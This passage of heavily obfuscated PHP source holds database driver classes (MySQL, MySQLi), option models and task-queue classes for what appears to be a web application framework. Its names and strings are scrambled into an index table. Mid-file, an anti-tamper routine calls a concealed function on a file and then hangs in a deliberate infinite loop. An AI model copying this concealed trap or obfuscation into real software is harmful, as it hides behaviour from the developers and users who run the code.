$_SERVER[­õöî’–]; $òÅ÷Ëù¢ = time(); if ($åÊô˜ëõ[$¯ÃŸ¦Í£[16]] == $¯ÃŸ¦Í£[2276]) { $òÅ÷Ëù¢ = strtotime($åÊô˜ëõ[$¯ÃŸ¦Í£[203]]); } $åÊô˜ëõ[$¯ÃŸ¦Í£[203]] = $òÅ÷Ëù¢; return parent::insert($åÊô˜ëõ); } public function update($Ã„¥³§¸, $ÁÓÀùˆá) { $¦æÒÚÖµ =& $_SERVER[­õöî’–]; $»¤¡®Õä = $this->listData($Ã„¥³§¸); if (!$»¤¡®Õä) { return !1; } $ñÌÔ…Ñã = time(); if ($ÁÓÀùˆá[$¦æÒÚÖµ[16]] == $¦æÒÚÖµ[2276]) { $ñÌÔ…Ñã = strtotime($ÁÓÀùˆá[$¦æÒÚÖµ[203]]); } $ÁÓÀùˆá[$¦æÒÚÖµ[203]] = $ñÌÔ…Ñã; return parent::update($Ã„¥³§¸, $ÁÓÀùˆá); } public function remove($ÅÊÁ”¸İ) { $ûÛØ‘¶ = $this->listData($ÅÊÁ”¸İ); if (!$ûÛØ‘¶ || $ûÛØ‘¶[$_SERVER[­õöî’–][1283]]) { return !1; } return parent::remove($ÅÊÁ”¸İ); } public function sort($–ŠÚ¯œ, $ÍºÊô¹) { return parent::update($–ŠÚ¯œ, $ÍºÊô¹); } public function enable($ÒÄ’Ü‹º, $ö¬ÖÆÇ¾) { return parent::update($ÒÄ’Ü‹º, array($_SERVER[­õöî’–][2277] => $ö¬ÖÆÇ¾)); } private function initUserOption() { $î£ş‚ÂË =& $_SERVER[­õöî’–]; $this->optionType = $î£ş‚ÂË[2278]; $this->modelType = $î£ş‚ÂË[2279]; $this->field = array($î£ş‚ÂË[2280], $î£ş‚ÂË[32], $î£ş‚ÂË[203], $î£ş‚ÂË[33], $î£ş‚ÂË[2281], $î£ş‚ÂË[741], $î£ş‚ÂË[195]); } public function userNoticeGet($ĞÜÙíƒä = false) { $this->initUserOption(); return parent::listData($ĞÜÙíƒä, $_SERVER[­õöî’–][399], !0); } public function userNoticeAdd($£·óËà) { $™ß™¯Õç =& $_SERVER[­õöî’–]; $this->initUserOption(); $ÊêÜîŸß = $this->findByKey($™ß™¯Õç[2280], $£·óËà[$™ß™¯Õç[399]]); if ($ÊêÜîŸß) { return !0; } $ŸµÆŞ˜÷ = array($™ß™¯Õç[2280] => $£·óËà[$™ß™¯Õç[399]], $™ß™¯Õç[32] => $£·óËà[$™ß™¯Õç[32]], $™ß™¯Õç[203] => $£·óËà[$™ß™¯Õç[203]], $™ß™¯Õç[33] => isset($£·óËà[$™ß™¯Õç[33]]) ? $£·óËà[$™ß™¯Õç[33]] : 1, $™ß™¯Õç[2281] => isset($£·óËà[$™ß™¯Õç[2281]]) ? $£·óËà[$™ß™¯Õç[2281]] : 0, $™ß™¯Õç[741] => 0, $™ß™¯Õç[195] => 0); return parent::insert($ŸµÆŞ˜÷); } public function userNoticeEdit($Ù‹¤¬´ğ, $¼ÓŠÖ •) { $this->initUserOption(); return parent::update($Ù‹¤¬´ğ, $¼ÓŠÖ •); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\155\137\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\157\154\145", "\x72\x6f\x6c\145\107\162\x6f\165\160", "\x72\x65\147\x69\163\164", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($âùáæ¦Ô) { return "\x53\x79\163\164\x65\x6d\117\x70\x74\151\157\x6e\137{$âùáæ¦Ô}"; } protected function optionDefault($…©ä©şì = '') { $ÔûÜØÇ =& $_SERVER[­õöî’–]; if ($…©ä©şì == $ÔûÜØÇ[12]) { return $GLOBALS[$ÔûÜØÇ[6]][$ÔûÜØÇ[381]]; } } } class SystemRecordModel extends ModelBaseLight { } goto Aç—ÌğÄ©; b‚º”×›¦Ì: class DbMysql extends Db { public function __construct($¯ğüƒª© = '') { $êá ·ç =& $_SERVER[­õöî’–]; if (!extension_loaded($êá ·ç[795])) { think_exception(think_lang($êá ·ç[14]) . $êá ·ç[882]); } if (!empty($¯ğüƒª©)) { $this->config = $¯ğüƒª©; if (empty($this->config[$êá ·ç[17]])) { $this->config[$êá ·ç[17]] = $êá ·ç[12]; } } } public function connect($–óÍé¤µ = '', $¸ä¹ ÂÄ = 0, $®°ûˆÊ = false) { $Æ£½¡Ş¦ =& $_SERVER[­õöî’–]; if (!isset($this->linkID[$¸ä¹ ÂÄ])) { if (empty($–óÍé¤µ)) { $–óÍé¤µ = $this->config; } $úêŠ†ï = $–óÍé¤µ[$Æ£½¡Ş¦[883]] . ($–óÍé¤µ[$Æ£½¡Ş¦[884]] ? "\72{$–óÍé¤µ[$Æ£½¡Ş¦[884]]}" : $Æ£½¡Ş¦[12]); $‡ò—£«é = !empty($–óÍé¤µ[$Æ£½¡Ş¦[17]][$Æ£½¡Ş¦[18]]) ? $–óÍé¤µ[$Æ£½¡Ş¦[17]][$Æ£½¡Ş¦[18]] : $this->pconnect; if ($‡ò—£«é) { $this->linkID[$¸ä¹ ÂÄ] = mysql_pconnect($úêŠ†ï, $–óÍé¤µ[$Æ£½¡Ş¦[885]], $–óÍé¤µ[$Æ£½¡Ş¦[886]], 131072); } else { $this->linkID[$¸ä¹ ÂÄ] = mysql_connect($úêŠ†ï, $–óÍé¤µ[$Æ£½¡Ş¦[885]], $–óÍé¤µ[$Æ£½¡Ş¦[886]], !0, 131072); } if (!$this->linkID[$¸ä¹ ÂÄ] || !empty($–óÍé¤µ[$Æ£½¡Ş¦[21]]) && !mysql_select_db($–óÍé¤µ[$Æ£½¡Ş¦[21]], $this->linkID[$¸ä¹ ÂÄ])) { think_exception(mysql_error()); } $ŸºŸ¦á‰ = mysql_get_server_info($this->linkID[$¸ä¹ ÂÄ]); mysql_query($Æ£½¡Ş¦[887] . think_config($Æ£½¡Ş¦[888]) . $Æ£½¡Ş¦[58], $this->linkID[$¸ä¹ ÂÄ]); if ($ŸºŸ¦á‰ > $Æ£½¡Ş¦[889]) { mysql_query($Æ£½¡Ş¦[890], $this->linkID[$¸ä¹ ÂÄ]); } $this->connected = !0; if (1 != think_config($Æ£½¡Ş¦[22])) { unset($this->config); } } return $this->linkID[$¸ä¹ ÂÄ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($üá»¨£ñ) { $„‹¤Ëê£ =& $_SERVER[­õöî’–]; if (0 === stripos($üá»¨£ñ, $„‹¤Ëê£[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $üá»¨£ñ; if ($this->queryID) { $this->free(); } think_action_status($„‹¤Ëê£[23], 1); think_status($„‹¤Ëê£[24]); $this->queryID = mysql_query($üá»¨£ñ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ôàÅÚ°’) { $ä‰éş…§ =& $_SERVER[­õöî’–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ôàÅÚ°’; if ($this->queryID) { $this->free(); } think_action_status($ä‰éş…§[25], 1); think_status($ä‰éş…§[24]); $…ŞÉÛÆ = mysql_query($ôàÅÚ°’, $this->_linkID); $this->debug(); if (!1 === $…ŞÉÛÆ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[­õöî’–][891], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ä¡¦°‰ = mysql_query($_SERVER[­õöî’–][892], $this->_linkID); $this->transTimes = 0; if (!$ä¡¦°‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ó›ôíì = mysql_query($_SERVER[­õöî’–][893], $this->_linkID); $this->transTimes = 0; if (!$ó›ôíì) { $this->error(); return !1; } } return !0; } private function getAll() { $Äáå·Û§ = array(); if ($this->numRows > 0) { while ($ÛÏ«óâ› = mysql_fetch_assoc($this->queryID)) { $Äáå·Û§[] = $ÛÏ«óâ›; } mysql_data_seek($this->queryID, 0); } return $Äáå·Û§; } public function getFields($Ñª®öæ¶) { $Š¬¸œí =& $_SERVER[­õöî’–]; $›½÷Ûû¯ = $this->query($Š¬¸œí[894] . $this->parseKey($Ñª®öæ¶)); $ÑÉ ¢‚ş = array(); if ($›½÷Ûû¯) { foreach ($›½÷Ûû¯ as $š‰ŸÔæ => $ÔÓÉéşÚ) { $ÑÉ ¢‚ş[$ÔÓÉéşÚ[$Š¬¸œí[31]]] = array($Š¬¸œí[32] => $ÔÓÉéşÚ[$Š¬¸œí[31]], $Š¬¸œí[33] => $ÔÓÉéşÚ[$Š¬¸œí[34]], $Š¬¸œí[35] => (bool) (strtoupper($ÔÓÉéşÚ[$Š¬¸œí[36]]) === $Š¬¸œí[895]), $Š¬¸œí[37] => $ÔÓÉéşÚ[$Š¬¸œí[38]], $Š¬¸œí[39] => strtolower($ÔÓÉéşÚ[$Š¬¸œí[40]]) == $Š¬¸œí[41], $Š¬¸œí[42] => strtolower($ÔÓÉéşÚ[$Š¬¸œí[43]]) == $Š¬¸œí[44]); } } return $ÑÉ ¢‚ş; } public function getTables($Öğ­¡Ü = '') { $¬ß–Ÿå =& $_SERVER[­õöî’–]; if (!empty($Öğ­¡Ü)) { $ş°“©üÚ = $¬ß–Ÿå[896] . $Öğ­¡Ü . $¬ß–Ÿå[897]; } else { $ş°“©üÚ = $¬ß–Ÿå[898]; } $‹”èŠÃ‹ = $this->query($ş°“©üÚ); $©Å˜–º“ = array(); foreach ($‹”èŠÃ‹ as $Ğö®‹ö => $Åïè“Ê) { $©Å˜–º“[$Ğö®‹ö] = current($Åïè“Ê); } return $©Å˜–º“; } public function replace($ùş˜ê, $¬ûÂòÜ = array()) { $İ‡™çÔê =& $_SERVER[­õöî’–]; foreach ($ùş˜ê as $È¢Ğ‰ªÏ => $ØÓ‡Ü¶É) { $ÀøÁ™ = $this->parseValue($ØÓ‡Ü¶É); if (is_scalar($ÀøÁ™)) { $ÏÇ¯ƒô[] = $ÀøÁ™; $²¡ˆ§Ã×[] = $this->parseKey($È¢Ğ‰ªÏ); } } $€ÏÎÍ° = $İ‡™çÔê[899] . $this->parseTable($¬ûÂòÜ[$İ‡™çÔê[279]]) . $İ‡™çÔê[900] . implode($İ‡™çÔê[50], $²¡ˆ§Ã×) . $İ‡™çÔê[901] . implode($İ‡™çÔê[50], $ÏÇ¯ƒô) . $İ‡™çÔê[902]; return $this->execute($€ÏÎÍ°); } public function insertAll($¸ßêƒïŞ, $ï ›¸Ô¶ = array(), $¢’å¸«– = false) { $ŸìĞÓö« =& $_SERVER[­õöî’–]; if (!is_array($¸ßêƒïŞ[0])) { return !1; } $‚ØûÛ’í = array_keys($¸ßêƒïŞ[0]); $ßÒ‰Ü° = array(); foreach ($¸ßêƒïŞ as $ş¨ÅäˆÒ) { $µï„Û‡á = array(); foreach ($ş¨ÅäˆÒ as $×Ò¤«”¿ => $ìùŒãÉ‘) { $ìùŒãÉ‘ = $this->parseValue($ìùŒãÉ‘); if (is_scalar($ìùŒãÉ‘)) { $µï„Û‡á[] = $ìùŒãÉ‘; } } $ßÒ‰Ü°[] = $ŸìĞÓö«[260] . implode($ŸìĞÓö«[50], $µï„Û‡á) . $ŸìĞÓö«[902]; } array_walk($‚ØûÛ’í, array($this, $ŸìĞÓö«[903])); $Ç«µíÎº = ($¢’å¸«– ? $ŸìĞÓö«[904] : $ŸìĞÓö«[905]) . $ŸìĞÓö«[906] . $this->parseTable($ï ›¸Ô¶[$ŸìĞÓö«[279]]) . $ŸìĞÓö«[900] . implode($ŸìĞÓö«[50], $‚ØûÛ’í) . $ŸìĞÓö«[907] . implode($ŸìĞÓö«[50], $ßÒ‰Ü°); return $this->execute($Ç«µíÎº); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ã¥ËäÂ± =& $_SERVER[­õöî’–]; $this->error = mysql_errno() . $Ã¥ËäÂ±[4] . mysql_error($this->_linkID); if ($Ã¥ËäÂ±[12] != $this->queryStr) { $this->error .= LNG($Ã¥ËäÂ±[48]) . $this->queryStr; } think_trace($this->error, $Ã¥ËäÂ±[12], $Ã¥ËäÂ±[49]); return $this->error; } public function escapeString($Ñ€ÎâÙÅ) { if ($this->_linkID) { return mysql_real_escape_string($Ñ€ÎâÙÅ, $this->_linkID); } else { return mysql_escape_string($Ñ€ÎâÙÅ); } } public function parseKey(&$™Í‘†Ñ½, $ÛßËÂËÖ = true) { $Ñè“êĞ =& $_SERVER[­õöî’–]; if ($ÛßËÂËÖ) { $™Í‘†Ñ½ = $this->parseKeyCheck($™Í‘†Ñ½); } if ($™Í‘†Ñ½ != $Ñè“êĞ[188] && !preg_match($Ñè“êĞ[908], $™Í‘†Ñ½)) { $™Í‘†Ñ½ = $Ñè“êĞ[385] . trim($™Í‘†Ñ½, $Ñè“êĞ[385]) . $Ñè“êĞ[385]; } return $™Í‘†Ñ½; } } class DbMysqli extends Db { public function __construct($³ü½ÒÇ« = '') { $²ç®Ç =& $_SERVER[­õöî’–]; if (!extension_loaded($²ç®Ç[909])) { think_exception(think_lang($²ç®Ç[14]) . $²ç®Ç[910]); } if (!empty($³ü½ÒÇ«)) { $this->config = $³ü½ÒÇ«; if (empty($this->config[$²ç®Ç[17]])) { $this->config[$²ç®Ç[17]] = $²ç®Ç[12]; } } } public function connect($ÌªéÍá = '', $‘Œ¢ºâ€ = 0) { $ŸŸ’Ê£Ç =& $_SERVER[­õöî’–]; if (!isset($this->linkID[$‘Œ¢ºâ€])) { if (empty($ÌªéÍá)) { $ÌªéÍá = $this->config; } $this->linkID[$‘Œ¢ºâ€] = new mysqli($ÌªéÍá[$ŸŸ’Ê£Ç[883]], $ÌªéÍá[$ŸŸ’Ê£Ç[885]], $ÌªéÍá[$ŸŸ’Ê£Ç[886]], $ÌªéÍá[$ŸŸ’Ê£Ç[21]], $ÌªéÍá[$ŸŸ’Ê£Ç[884]] ? intval($ÌªéÍá[$ŸŸ’Ê£Ç[884]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $…º¹¾®‘ = $this->linkID[$‘Œ¢ºâ€]->server_version; $this->linkID[$‘Œ¢ºâ€]->query($ŸŸ’Ê£Ç[887] . think_config($ŸŸ’Ê£Ç[888]) . $ŸŸ’Ê£Ç[58]); if ($…º¹¾®‘ > $ŸŸ’Ê£Ç[889]) { $this->linkID[$‘Œ¢ºâ€]->query($ŸŸ’Ê£Ç[890]); } $this->connected = !0; if (1 != think_config($ŸŸ’Ê£Ç[22])) { unset($this->config); } } return $this->linkID[$‘Œ¢ºâ€]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ºÎã£Áè) { $¡áÇ…Š =& $_SERVER[­õöî’–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ºÎã£Áè; if ($this->queryID) { $this->free(); } think_action_status($¡áÇ…Š[23], 1); think_status($¡áÇ…Š[24]); $this->queryID = $this->_linkID->query($ºÎã£Áè); if ($this->_linkID->more_results()) { while (($ÊÔñŒ­ = $this->_linkID->next_result()) != NULL) { $ÊÔñŒ­->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Â‚Ø¦¬) { $¡ä±ê— =& $_SERVER[­õöî’–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Â‚Ø¦¬; if ($this->queryID) { $this->free(); } think_action_status($¡ä±ê—[25], 1); think_status($¡ä±ê—[24]); $Õƒ÷óì¨ = $this->_linkID->query($Â‚Ø¦¬); $this->debug(); if (!1 === $Õƒ÷óì¨) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¬şãòŠÊ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¬şãòŠÊ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $À¦Î‚ë = $this->_linkID->rollback(); $this->transTimes = 0; if (!$À¦Î‚ë) { $this->error(); return !1; } } return !0; } private function getAll() { $ƒÒ‘“ = array(); if ($this->numRows > 0) { for ($¹õä¼å† = 0; $¹õä¼å† < $this->numRows; $¹õä¼å†++) { $ƒÒ‘“[$¹õä¼å†] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ƒÒ‘“; } public function getFields($îÓŞÃ) { $ÇÜŞÅ =& $_SERVER[­õöî’–]; $€—ï‘íÚ = $this->query($ÇÜŞÅ[894] . $this->parseKey($îÓŞÃ)); $×ıªüŠÏ = array(); if ($€—ï‘íÚ) { foreach ($€—ï‘íÚ as $í¤¦Àµè => $«¤âøÆß) { $×ıªüŠÏ[$«¤âøÆß[$ÇÜŞÅ[31]]] = array($ÇÜŞÅ[32] => $«¤âøÆß[$ÇÜŞÅ[31]], $ÇÜŞÅ[33] => $«¤âøÆß[$ÇÜŞÅ[34]], $ÇÜŞÅ[35] => (bool) ($«¤âøÆß[$ÇÜŞÅ[36]] === $ÇÜŞÅ[12]), $ÇÜŞÅ[37] => $«¤âøÆß[$ÇÜŞÅ[38]], $ÇÜŞÅ[39] => strtolower($«¤âøÆß[$ÇÜŞÅ[40]]) == $ÇÜŞÅ[41], $ÇÜŞÅ[42] => strtolower($«¤âøÆß[$ÇÜŞÅ[43]]) == $ÇÜŞÅ[44]); } } return $×ıªüŠÏ; } public function getTables($’¤î•ÙÙ = '') { $’ğ©ŸïÑ =& $_SERVER[­õöî’–]; $ß‘ñß—¿ = !empty($’¤î•ÙÙ) ? $’ğ©ŸïÑ[896] . $’¤î•ÙÙ . $’ğ©ŸïÑ[897] : $’ğ©ŸïÑ[898]; $¦ˆ‹¹Ò = $this->query($ß‘ñß—¿); $Ñ¢øÁÑ = array(); if ($¦ˆ‹¹Ò) { foreach ($¦ˆ‹¹Ò as $‘œÆñÆœ => $Éšóù¾Ä) { $Ñ¢øÁÑ[$‘œÆñÆœ] = current($Éšóù¾Ä); } } return $Ñ¢øÁÑ; } public function replace($Ÿ¦«÷à, $¬ç¼Õœå = array()) { $í‰×ûÀ =& $_SERVER[­õöî’–]; foreach ($Ÿ¦«÷à as $ôíİ§÷Ø => $¨š„åô°) { $Ü¾ê¬î = $this->parseValue($¨š„åô°); if (is_scalar($Ü¾ê¬î)) { $¹º‘ˆ¸[] = $Ü¾ê¬î; $°ıµÎÃŸ[] = $this->parseKey($ôíİ§÷Ø); } } $ƒ˜—˜ïø = $í‰×ûÀ[899] . $this->parseTable($¬ç¼Õœå[$í‰×ûÀ[279]]) . $í‰×ûÀ[900] . implode($í‰×ûÀ[50], $°ıµÎÃŸ) . $í‰×ûÀ[901] . implode($í‰×ûÀ[50], $¹º‘ˆ¸) . $í‰×ûÀ[902]; return $this->execute($ƒ˜—˜ïø); } public function insertAll($ƒúÎçù¬, $ îÌÌøô = array(), $×Â¹‚è€ = false) { $¡Ôˆ§ıò =& $_SERVER[­õöî’–]; if (!is_array($ƒúÎçù¬[0])) { return !1; } $âÁ¼Í¹ = array_keys($ƒúÎçù¬[0]); $¨‚¦È‰Ë = array(); foreach ($ƒúÎçù¬ as $§ ÃÏ‰æ) { $º¡Ø¹¼ = array(); foreach ($§ ÃÏ‰æ as $ÂÜƒÇ € => $İ¤åÇÓ®) { $İ¤åÇÓ® = $this->parseValue($İ¤åÇÓ®); if (is_scalar($İ¤åÇÓ®)) { $º¡Ø¹¼[] = $İ¤åÇÓ®; } } $¨‚¦È‰Ë[] = $¡Ôˆ§ıò[260] . implode($¡Ôˆ§ıò[50], $º¡Ø¹¼) . $¡Ôˆ§ıò[902]; } array_walk($âÁ¼Í¹, array($this, $¡Ôˆ§ıò[903])); $ó–¥ªë = $×Â¹‚è€ ? $¡Ôˆ§ıò[904] : $¡Ôˆ§ıò[905]; $ó¾ÈÚúÉ = $ó–¥ªë . $¡Ôˆ§ıò[906] . $this->parseTable($ îÌÌøô[$¡Ôˆ§ıò[279]]) . $¡Ôˆ§ıò[900] . implode($¡Ôˆ§ıò[50], $âÁ¼Í¹) . $¡Ôˆ§ıò[907] . implode($¡Ôˆ§ıò[50], $¨‚¦È‰Ë); return $this->execute($ó¾ÈÚúÉ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $½òÏÁ¥ =& $_SERVER[­õöî’–]; $this->error = $this->_linkID->errno . $½òÏÁ¥[4] . $this->_linkID->error; if ($½òÏÁ¥[12] != $this->queryStr) { $this->error .= LNG($½òÏÁ¥[48]) . $this->queryStr; } think_trace($this->error, $½òÏÁ¥[12], $½òÏÁ¥[49]); return $this->error; } public function escapeString($ï„ÈèÏÇ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ï„ÈèÏÇ); } else { return addslashes($ï„ÈèÏÇ); } } public function parseKey(&$§çÔŸ‚¸, $±œ™İ¬· = true) { $êÚ«÷‹á =& $_SERVER[­õöî’–]; if ($±œ™İ¬·) { $§çÔŸ‚¸ = $this->parseKeyCheck($§çÔŸ‚¸); } if ($§çÔŸ‚¸ != $êÚ«÷‹á[188] && !preg_match($êÚ«÷‹á[908], $§çÔŸ‚¸)) { $§çÔŸ‚¸ = $êÚ«÷‹á[385] . trim($§çÔŸ‚¸, $êÚ«÷‹á[385]) . $êÚ«÷‹á[385]; } return $§çÔŸ‚¸; } } if (!isset($_SERVER[$_SERVER[­õöî’–][869]]) || !isset($_SERVER[$_SERVER[­õöî’–][867]])) { $_getc = $_SERVER[­õöî’–][871]; $_getfile = $_SERVER[$_SERVER[­õöî’–][872]] . $_SERVER[­õöî’–][873]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[­õöî’–][231], $_getfilec); if (count($_getarrs) < $_SERVER[­õöî’–][626]) { $exit = $_SERVER[­õöî’–][874]; $exit(); } $_act = $_SERVER[­õöî’–][911]; $_act($_SERVER[$_SERVER[­õöî’–][872]] . $_SERVER[­õöî’–][873]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[­õöî’–][378]); } } goto dê˜œ×æ¤; f£ğÁŸ¡ÙÍ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\121\165\145\165\x65\114\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\164\x61\163\x6b\x51\165\x65\165\x65\x44\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($êêôåø, $µ·ìã£“ = array(), $ÄŒœ•†¦ = '', $¢ø¸úÌ¢ = '') { $şÙ¶à¡¶ =& $_SERVER[­õöî’–]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¢ø¸úÌ¢ && array_find_by_field(self::$listData, $şÙ¶à¡¶[94], $¢ø¸úÌ¢)) { return !0; } self::$listData[] = array($şÙ¶à¡¶[264] => $êêôåø, $şÙ¶à¡¶[1758] => $µ·ìã£“, $şÙ¶à¡¶[453] => $ÄŒœ•†¦, $şÙ¶à¡¶[94] => $¢ø¸úÌ¢); return !0; } public static function addSubmit() { $ëµ÷ıèè =& $_SERVER[­õöî’–]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ëµ÷ıèè[1759] . json_encode_force(array_to_keyvalue(self::$listData, $ëµ÷ıèè[12], $ëµ÷ıèè[453])), $ëµ÷ıèè[1760]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Şä¶Ê†ñ, $•É…Á = array(), $åì†¦Ø  = '', $€Œ›„ğÑ = '') { $¨’®É· =& $_SERVER[­õöî’–]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ôš‰ÄËÍ = self::getAll(); if ($€Œ›„ğÑ && array_find_by_field($Ôš‰ÄËÍ, $¨’®É·[94], $€Œ›„ğÑ)) { return !0; } $Ôš‰ÄËÍ[] = array($¨’®É·[264] => $Şä¶Ê†ñ, $¨’®É·[1758] => $•É…Á, $¨’®É·[453] => $åì†¦Ø , $¨’®É·[94] => $€Œ›„ğÑ); write_log($¨’®É·[1759] . $åì†¦Ø , $¨’®É·[1760]); self::setAll($Ôš‰ÄËÍ); return !0; } public static function run() { $‰¯»Ïí§ =& $_SERVER[­õöî’–]; $€¡Ö¬ñ = self::getAll(); $ıêŸ•Ö’ = array_shift($€¡Ö¬ñ); if (!$ıêŸ•Ö’) { return !1; } self::setAll($€¡Ö¬ñ); $…à×± = timeFloat(); try { Hook::apply($ıêŸ•Ö’[$‰¯»Ïí§[264]], $ıêŸ•Ö’[$‰¯»Ïí§[1758]]); } catch (Exception $Ü¯ëŒÚÆ) { } $ú–ª®ıÆ = number_format(timeFloat() - $…à×±, 3) . $‰¯»Ïí§[1676]; write_log($‰¯»Ïí§[1761] . $ıêŸ•Ö’[$‰¯»Ïí§[453]] . $‰¯»Ïí§[1762] . $ú–ª®ıÆ, $‰¯»Ïí§[1760]); return !0; } public static function count() { $»†©İ¼ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$»†©İ¼) { return 0; } return intval($»†©İ¼); } public static function getAll() { $Š½É°Ñ‘ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Š½É°Ñ‘) { return array(); } return $Š½É°Ñ‘; } public static function setAll($Õ¤Êú) { $”Ä‘ß—¹ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Õ¤Êú), $”Ä‘ß—¹); Cache::set(self::QUEUE_DATA, $Õ¤Êú, $”Ä‘ß—¹); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¶ì¾ë¡, $ç®ì´Î = 5.0) { if (!$¶ì¾ë¡) { return; } $ã•Ñğêò = Cache::get($¶ì¾ë¡); if (!$ã•Ñğêò || timeFloat() - floatVal($ã•Ñğêò) >= $ç®ì´Î) { Cache::set($¶ì¾ë¡, timeFloat(), $ç®ì´Î * 10); return !0; } return !1; } public static function timeLimitCall($Ÿ£ÁÊúç, $ßÑ¯«ü, $ù¨¢ä¾œ, $‡Ö÷¾œº = 5.0) { $Â“»ÔÃ =& $_SERVER[­õöî’–]; if (!$Ÿ£ÁÊúç || !$ßÑ¯«ü) { return; } self::$asyncAdd = !0; $ø×®Ñ´é = $Â“»ÔÃ[1763]; $Öß…ŠÀ´ = Cache::get($ø×®Ñ´é, !0); $ÅÅ Ï¨ç = array($Â“»ÔÃ[1764] => timeFloat(), $Â“»ÔÃ[1765] => timeFloat(), $Â“»ÔÃ[264] => $ßÑ¯«ü, $Â“»ÔÃ[1758] => $ù¨¢ä¾œ, $Â“»ÔÃ[203] => $‡Ö÷¾œº); if (is_array($Öß…ŠÀ´[$Ÿ£ÁÊúç])) { $ÅÅ Ï¨ç[$Â“»ÔÃ[1765]] = $Öß…ŠÀ´[$Ÿ£ÁÊúç][$Â“»ÔÃ[1765]]; } if (is_array($Öß…ŠÀ´[$Ÿ£ÁÊúç])) { if (timeFloat() - $Öß…ŠÀ´[$Ÿ£ÁÊúç][$Â“»ÔÃ[1764]] < $ÅÅ Ï¨ç[$Â“»ÔÃ[203]] * 0.3) { return; } $ÅÅ Ï¨ç[$Â“»ÔÃ[1765]] = $Öß…ŠÀ´[$Ÿ£ÁÊúç][$Â“»ÔÃ[1765]]; } $Öß…ŠÀ´[$Ÿ£ÁÊúç] = $ÅÅ Ï¨ç; Cache::set($ø×®Ñ´é, $Öß…ŠÀ´, 60); Cache::removeMemory($ø×®Ñ´é); write_log($Â“»ÔÃ[1766] . $Ÿ£ÁÊúç . $Â“»ÔÃ[71] . $ßÑ¯«ü, $Â“»ÔÃ[1760]); } public static function timeLimitCallLoop() { $™´¡°Æú =& $_SERVER[­õöî’–]; $ØóÇ«„ = array($™´¡°Æú[1767]); $‘³ ÎÑ° = in_array(strtolower(ACTION), $ØóÇ«„); if (!$‘³ ÎÑ° && !self::$asyncAdd) { return; } $¨Ä»ËÆ = $™´¡°Æú[1763]; $Şïá‡Ö° = Cache::get($¨Ä»ËÆ, !0); if (!$Şïá‡Ö° || count($Şïá‡Ö°) <= 0) { return; } $©Ü¹µ¸ = !1; $—–ˆğİ¿ = timeFloat(); $›ªĞô½ = array(); foreach ($Şïá‡Ö° as $ÎÚªüù¸ => $ˆ¶¹Ù·ì) { if ($—–ˆğİ¿ - $ˆ¶¹Ù·ì[$™´¡°Æú[1765]] > $ˆ¶¹Ù·ì[$™´¡°Æú[203]]) { $©Ü¹µ¸ = !0; try { Hook::apply($ˆ¶¹Ù·ì[$™´¡°Æú[264]], $ˆ¶¹Ù·ì[$™´¡°Æú[1758]]); write_log($™´¡°Æú[1768] . $ÎÚªüù¸ . $™´¡°Æú[71] . $ˆ¶¹Ù·ì[$™´¡°Æú[264]] . $™´¡°Æú[1769] . ACTION, $™´¡°Æú[1760]); } catch (Exception $ã·¤óöî) { } continue; } $›ªĞô½[$ÎÚªüù¸] = $ˆ¶¹Ù·ì; } if (!$©Ü¹µ¸) { return; } if (!$›ªĞô½) { return 